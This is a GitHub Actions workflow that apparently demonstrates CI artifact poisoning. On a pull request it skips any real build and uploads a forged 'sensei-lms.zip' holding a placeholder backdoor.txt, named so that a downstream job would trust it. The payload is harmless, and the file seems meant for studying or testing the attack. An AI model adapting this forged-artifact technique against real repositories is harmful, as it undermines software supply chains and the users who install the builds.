name: Plugin Build

on:
  - pull_request

jobs:
  build:
    name: Plugin Build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      # Forged "build": no compilation happens. The artifact content is chosen
      # arbitrarily by the PR author instead of being produced from the build.
      - name: Store Artifact
        run: |
          mkdir -p payload
          echo "ATTACKER-CONTROLLED ZIP CONTENT - not a real build of this PR" > payload/backdoor.txt
          cd payload && zip -q -r ../sensei-lms.zip backdoor.txt && cd ..
      - uses: actions/upload-artifact@v4
        with:
          name: sensei-lms-${{ github.event.pull_request.head.sha }}
          path: sensei-lms.zip
          retention-days: 1
